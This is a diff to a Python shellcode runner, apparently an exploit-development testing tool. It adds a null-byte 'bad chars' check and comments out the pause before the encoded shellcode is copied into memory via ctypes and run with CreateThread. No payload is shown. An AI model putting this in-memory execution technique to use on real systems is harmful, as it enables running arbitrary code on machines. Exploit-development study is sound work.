@@ -259,6 +259,14 @@ print("Encoding %d instructions.." % count)
 sh = b""
 
 for e in encoding:
+    if e == 0x00:
+        print()
+        print()
+        print()
+        print("Bad chars found")
+        print()
+        print()
+        print()
     sh += struct.pack("B", e)
 
 shellcode = bytearray(sh)
@@ -282,7 +290,7 @@ ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                      ctypes.c_int(len(shellcode)))
 
 print("Shellcode located at address %s" % hex(ptr))
-input("...ENTER TO EXECUTE SHELLCODE...")
+# input("...ENTER TO EXECUTE SHELLCODE...")
 
 ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                          ctypes.c_int(0),
